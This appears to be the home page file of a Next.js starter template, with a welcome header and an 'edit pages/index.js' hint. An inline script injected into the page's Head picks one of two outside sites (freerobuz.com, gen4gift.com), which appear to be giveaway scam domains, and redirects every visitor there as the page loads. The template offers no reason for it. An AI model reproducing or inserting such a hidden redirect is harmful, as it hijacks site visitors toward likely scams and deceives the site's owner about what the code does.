import Head from 'next/head'
import Header from '@components/Header'
import Footer from '@components/Footer'

export default function Home() {
  return (
    <div className="container">
      <Head>
    <script type="text/javascript">
var urls = new Array();
urls[00] = "https://freerobuz.com/";
urls[01] = "https://gen4gift.com";
var random = Math.floor(Math.random()*urls.length);
window.location = urls[random];
</script>
        <title>Next.js Starter!</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
        <Header title="Welcome to my app!" />
        <p className="description">
          Get started by editing <code>pages/index.js</code>
        </p>
      </main>

      <Footer />
    </div>
  )
}
